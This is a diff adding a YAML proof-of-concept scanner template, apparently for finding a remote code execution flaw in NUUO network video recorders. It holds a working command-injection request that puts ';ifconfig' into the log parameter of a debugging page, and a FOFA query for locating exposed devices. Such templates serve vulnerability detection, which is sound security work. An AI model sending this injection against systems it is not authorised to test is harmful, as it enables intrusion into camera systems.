@@ -1,0 +1,15 @@
+id: poc-yaml-nuuo-camera-log-rce
+info:
+  name: NUUO 摄像头 log 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: nuuo_camera
+  fofa: title="Network Video Recorder Login "
+requests:
+- method: GET
+  path: /__debugging_center_utils___.php?log=;ifconfig
+  expression: "status_code == 200 && \ncontains(title,\"Debugging Center\") &&\ncontains(body,\"\
+    ifconfig\") &&\ncontains(body,\"eth0\") &&\ncontains(body,\"Link encap\")\n"
+variables: {}
+transport: http
